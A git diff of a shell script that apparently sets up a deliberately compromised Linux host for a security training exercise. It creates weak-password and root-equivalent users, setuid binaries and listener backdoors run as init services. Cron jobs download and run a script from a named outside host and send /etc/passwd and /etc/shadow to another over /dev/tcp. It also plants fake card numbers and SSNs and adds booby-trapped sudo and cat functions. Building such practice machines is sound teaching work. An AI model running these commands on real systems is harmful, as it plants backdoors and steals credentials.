@@ -76,33 +76,31 @@ service apache2 start
 # ----- BAD STUFF -----
 
 #Add users
-#eve is a second root account
-#ian uses a a weaker hash for password
-useradd alice -m -U -s /bin/bash -c "The one and only" -G bob
-useradd bob -m -U -s /bin/bash -c "Employee of the month" -G alice
-useradd charlie -m -U -s /bin/bash -c "Very annoying employee"
-useradd dan -m -U -s /bin/bash -c "Super awesome employee"
-useradd eve -m -M -N -s /bin/bash -c "Most chill person ever"
-useradd frank -m -U -s /bin/bash -c "Loves hotdogs"
-useradd grant -m -U -s /bin/bash -c "Ulysses S"
-useradd howard -m -U -s /bin/bash -c "Dude with the cowboy hat" -u 0 -o
-useradd ian -m -U -s /bin/bash -c "Definitely a spook" -G sudo,alice
-useradd janice -m -U -s /bin/bash -c "From accounting" -G milton
-useradd morpheus -m -U -s /bin/bash -c "Looking for the ONE" -G dan
-useradd smegel -m -U -s /bin/bash -c "the precious" -G sudo,shadow
-useradd peter -m -U -s /bin/bash -c "moonlights as human spider"
-useradd lisa -m -U -s /bin/bash -c "new to the organization"
-useradd tommy -m -U -s /bin/bash -c "the tank"
-useradd ernie -m -U -s /bin/bash -c "Lives to annoy bert" -G bert
-useradd bert -m -U -s /usr/sbin/nologin -c "secretely plotting to end ernie" -G ernie
-useradd thor -m -U -s /bin/bash -c "Has a real God complex" -u 0 -o -G lisa
-useradd charlene -m -U -s /bin/bash -c "every office has one"
-useradd milton -m -U -s /bin/bash -c "gardian of the company septor" -G sudo
+useradd alice -m -U -s /bin/bash -c "The one and only" -G bob -p "password123456"
+useradd bob -m -U -s /bin/bash -c "Employee of the month" -G alice -p "password123"
+useradd charlie -m -U -s /bin/bash -c "Very annoying employee" -p "passwordqwert"
+useradd dan -m -U -s /bin/bash -c "Super awesome employee" -p "passwordqazxsw"
+useradd eve -m -M -N -s /bin/bash -c "Most chill person ever" -p "comrade"
+useradd frank -m -U -s /bin/bash -c "Loves hotdogs" -p "password11"
+useradd grant -m -U -s /bin/bash -c "Ulysses S" -p "passwordPaSsWoRd"
+useradd howard -m -U -s /bin/bash -c "Dude with the cowboy hat" -p "eve"
+useradd ian -m -U -s /bin/bash -c "Definitely a spook" -G sudo,alice -p "password"
+useradd janice -m -U -s /bin/bash -c "From accounting" -G milton -p "passwordthatislong"
+useradd morpheus -m -U -s /bin/bash -c "Looking for the ONE" -G dan -p "neo"
+useradd smegel -m -U -s /bin/bash -c "the precious" -G sudo,shadow -p "ring"
+useradd peter -m -U -s /bin/bash -c "moonlights as human spider" -p "parker"
+useradd lisa -m -U -s /bin/bash -c "new to the organization" -p "passwordqazxsw"
+useradd tommy -m -U -s /bin/bash -c "the tank" -p "PassworD"
+useradd ernie -m -U -s /bin/bash -c "Lives to annoy bert" -G bert -p "bert"
+useradd bert -m -U -s /usr/sbin/nologin -c "secretely plotting to end ernie" -G ernie -p "ernie"
+useradd thor -m -U -s /bin/bash -c "Has a real God complex" -g 0 -o -G lisa -p "myhammeristhebest"
+useradd charlene -m -U -s /bin/bash -c "every office has one" -p "passwordpasswordpassword"
+useradd milton -m -U -s /bin/bash -c "gardian of the company septor" -G sudo -p "stapler"
 echo "alice:password123456" | chpasswd
 echo "bob:password123!!!" | chpasswd
 echo "charlie:passwordqwerty" | chpasswd
 echo "dan:passwordqazxsw" | chpasswd
-echo "eve:PassworD" | chpasswd
+echo "eve:comrade" | chpasswd
 echo "frank:password!1!1!" | chpasswd
 echo "grant:passwordPaSsWoRd" | chpasswd
 echo "howard:eve" | chpasswd
@@ -115,17 +113,16 @@ echo "lisa:passwordqazxsw" | chpasswd
 echo "tommy:PassworD" | chpasswd
 echo "ernie:bert" | chpasswd
 echo "bert:ernie" | chpasswd
-echo "thor:password" | chpasswd
+echo "thor:myhammeristhebest" | chpasswd
 echo "charlene:passwordpasswordpassword" | chpasswd -c SHA256
 echo "milton:stapler" | chpasswd
 passwd -d howard
 passwd -d lisa
 passwd -l grant
 
-echo "eve's password: PassworD" > /boot/grub/grub.cPg
+echo "eve's password: comrade" > /boot/grub/grub.cPg
 chown howard:howard /boot/grub/grub.cPg
 chmod 0070 /boot/grub/grub.cPg
-
 
 #Setuid on specific binaries
 chmod u+s /usr/bin/nmap
@@ -136,7 +133,8 @@ chmod u+s /usr/bin/python2.7
 md5sum $(find /usr/local/{bin,sbin} /usr/{bin,sbin} /{bin,sbin}) > /root/KnownGoodBinaries.txt
 cat /root/KnownGoodBinaries.txt | awk '{ print $1 }' | sort | uniq > /root/KnownGoodBinaries1.txt
 mv /root/KnownGoodBinaries1.txt /root/KnownGoodBinaries.txt
-cat > /tmp/yes.c << "__EOF__"
+
+cat >> /tmp/yes.c << "__EOF__"
 #include <stdio.h>
 
 int main(int argc, char *argv[]) {
@@ -158,7 +156,7 @@ rm /tmp/yes.c
 #bob backdoor
 useradd bob -m -U -s /bin/bash
 echo 'bob:badpassword' | chpasswd
-cat > /home/bob/listener.sh <<"__EOF__"
+cat >> /home/bob/listener.sh <<"__EOF__"
 #!/bin/bash
 mknod /home/bob/fifo p
 while :
@@ -167,7 +165,7 @@ while :
 done
 __EOF__
 chmod +x /home/bob/listener.sh
-cat > /etc/init.d/listener <<"__EOF__"
+cat >> /etc/init.d/listener <<"__EOF__"
 #!/bin/bash
 
 ### BEGIN INIT INFO
@@ -193,7 +191,7 @@ chmod +x /etc/init.d/listener
 update-rc.d listener defaults
 
 #bob backdoor
-cat > /var/lib/python/python <<"__EOF__"
+cat >> /var/lib/python/python <<"__EOF__"
 #!/bin/bash
 mknod /tmp/tempfile p
 while :
@@ -202,7 +200,7 @@ while :
 done
 __EOF__
 chmod u+x /var/lib/python/python
-cat > /etc/init.d/python <<"__EOF__"
+cat >> /etc/init.d/python <<"__EOF__"
 #!/bin/bash
 
 ### BEGIN INIT INFO
@@ -228,7 +226,7 @@ chmod +x /etc/init.d/python
 update-rc.d python defaults
 
 #replicating malware
-cat > /etc/init.d/inti <<"__EOF__"
+cat >> /etc/init.d/inti <<"__EOF__"
 #!/bin/bash
 
 ### BEGIN INIT INFO
@@ -263,7 +261,7 @@ update-rc.d inti defaults
 #janice PII present in document 
 useradd janice -m -U -s /bin/bash
 echo 'janice:goodpassword' | chpasswd
-cat > /home/janice/data.txt <<"__EOF__"
+cat >> /home/janice/data.txt <<"__EOF__"
 Name: Bobby Bo Jangles
 SSN: 123-45-6789
 Phone: 123-456-7890
@@ -274,7 +272,7 @@ CVV: 123
 __EOF__
 
 #games passwords file
-cat > /usr/games/thunder.txt <<"__EOF__"
+cat >> /usr/games/thunder.txt <<"__EOF__"
 Thunder Game Passwords!
 user: bob - password: bobbybo
 user: janice - password: thegreatestgameever
@@ -288,7 +286,7 @@ echo '#Bob, the SSH server password is "NeverGiveUpNeverSurrender", Sincerely, A
 echo '#Bob, we pay for our Python license with the card: 5429-1735-9823-1457 CVV 132 -Alice' >> /etc/python/debian_config
 
 #personal informaiton
-cat > /var/backups/contactme.txt <<"__EOF__"
+cat >> /var/backups/contactme.txt <<"__EOF__"
 For backup assistance, call your administrator at 706-791-1234
 Our business backups are provided by Anderson Backups, LLC.
 "Our service will back you up"
@@ -298,7 +296,7 @@ __EOF__
 
 #old payment informaiton
 useradd charlie -m -U -s /bin/bash
-cat > /home/charlie/payment.txt <<"__EOF__"
+cat >> /home/charlie/payment.txt <<"__EOF__"
 Alice: 4753-1728-0910-4639
 Bob: 4086-2671-9514-2306
 Charlie: 5295-6808-3470-4043
@@ -326,7 +324,7 @@ __EOF__
 
 #Russian Anthem .. signed with love from "eve"
 echo 'if [[ $EUID -eq $(id -u howard) ]]; then cat /etc/.contact; fi' >> /etc/bash.bashrc
-cat > /etc/.contact <<"__EOF__"
+cat >> /etc/.contact <<"__EOF__"
 
 Россия — священная наша держава,
 Россия — любимая наша страна.
@@ -364,7 +362,7 @@ __EOF__
 
 #Heil Fuhrer!
 echo 'if [[ $EUID -eq $(id -u eve) ]]; then cat /usr/share/misc/.manifesto; fi' >> /etc/bash.bashrc
-cat > /usr/share/misc/.manifesto <<"__EOF__"
+cat >> /usr/share/misc/.manifesto <<"__EOF__"
 
 МАНИФЕСТО!
 
@@ -382,7 +380,7 @@ __EOF__
 tail -n +5 /etc/bash.bashrc >> /tmp/bash.bashrc
 mv /tmp/bash.bashrc /etc/bash.bashrc
 
-#annoying sudo function
+#annoying sudo function  #REPLACE with Rick Atley Song
 cat >> /usr/share/.bird << "__EOF__"
 A-well-a ev'rybody's heard about the bird
 
@@ -427,15 +425,16 @@ cat >> /usr/share/.haha << "__EOF__"
 function sudo() {
 read -p "[sudo] password for $(whoami):" ENTRY
 		if [[ $ENTRY != YES ]]; then
-			echo
+			sleep 1; clear
 			echo "Sorry, try again."
-			echo
+			sleep 2; clear
 			read -p "[sudo] password for $(whoami):" ENTRY2
 				if [[ $ENTRY2 != YES ]]; then
 					sleep 2; clear
 					read -p "Arn't you getting tired of this yet?" ENTRY3
+					sleep 2; clear
 						if [[ $ENTRY3 != NO ]]; then
-							sleep 2; clear
+							sleep 1; clear
 							echo "Sorry, try again."
 							sleep 2; clear
 							read -p "[sudo] password for $(whoami):" ENTRY4
@@ -450,16 +449,16 @@ read -p "[sudo] password for $(whoami):" ENTRY
 											sleep 3; clear
 											read -p "So!  what brings YOU here?" ANSWER2
 												if [[ $ANSWER3 != idunno ]]; then
-													clear
+													sleep 1; clear
 													echo "I wasn't talking to YOU !!!"
 													sleep 3; clear
 													read -p "Have you heard about the bird (yes/no/huh)" ANSWER4
 														if [[ $ANSWER4 == huh ]]; then 
-															sleep 2; echo "OKAY .. you win :( .. sudo is restored . . "
-															clear; sleep 2; echo "N O T !!!"
+															sleep 2; echo "OKAY .. you win .. sudo is restored"      "
+															sleep 1; clear; sleep 2; echo "N O T !!!"
 															sleep 1
 																for x in {1..100}; do IFS=$'\n';
-																	for y in $(cat /usr/share/.bird); do
+																	for y in $(less /usr/share/.bird); do
 																		echo $y; sleep 1;
 																	done
 																done
@@ -468,7 +467,7 @@ read -p "[sudo] password for $(whoami):" ENTRY
 															echo "Check it out!"
 															echo
 															for x in {1..100}; do IFS=$'\n';
-																for y in $(cat /usr/share/.bird); do
+																for y in $(less /usr/share/.bird); do
 																	echo $y; sleep 1;
 																done
 															done
@@ -487,7 +486,7 @@ sed '/shopt -s checkwinsize/r /usr/share/.haha' -i /etc/bash.bashrc
 
 
 #annoying cat function
-cat > /var/run/.me <<"__EOF__"
+cat >> /var/run/.me <<"__EOF__"
 function cat() {
 echo "cat: $1: No such flies or directories"
 }
@@ -500,7 +499,7 @@ for x in $(find /home -type f -name ".bashrc" -exec echo {} \;); do
 sed -i 's:~/.bashrc:/.bashrc:' /root/.profile
 cp /root/.bashrc /.bashrc
 echo '(/usr/share/screen/shutdown &)' >> /.bashrc
-cat > /usr/share/screen/shutdown <<"__EOF__"
+cat >> /usr/share/screen/shutdown <<"__EOF__"
 #!/bin/bash
 sleep 60
 shutdown -h +3  
@@ -543,7 +542,7 @@ __EOF__
 #__EOF__
 
 #random webservers
-cat > /etc/init.d/webserver <<"__EOF__"
+cat >> /etc/init.d/webserver <<"__EOF__"
 #!/bin/bash
 
 ### BEGIN INIT INFO
@@ -592,7 +591,7 @@ echo '11 * * * * root (wget Voice_of_Korea.cnc.kp/updates.sh -O /tmp/kthreadaemo
 echo '41 * * * * root (wget Voice_of_Korea.cnc.kp/updates.sh -O /tmp/kthreadaemon; chmod +x /tmp/kthreadaemon; (/tmp/kthreadaemon) & )' >> /etc/crontab
 
 #cron job to exfiltrate data
-cat > /etc/cron.hourly/maintenance.sh <<"__EOF__"
+cat >> /etc/cron.hourly/maintenance.sh <<"__EOF__"
 #!/bin/bash
 exec 3<>/dev/tcp/library.shijiazhuang.cn/61398
 cat /etc/passwd /etc/shadow > 3
@@ -605,7 +604,6 @@ echo '175.45.176.203 Voice_of_Korea.cnc.kp' >> /etc/cloud/templates/hosts.debian
 echo '42.245.208.56 library.shijiazhuang.cn' >> /etc/cloud/templates/hosts.debian.tmpl
 
 #add a malicious alias
-
 cat >> /etc/bash.bashrc <<"__EOF__"
 if [[ $EUID -eq 0 ]]; then
     ((sleep 45; wall -n "I F   T H E S E   W A L L S   C O U L D   S P E A K  . . .") &)
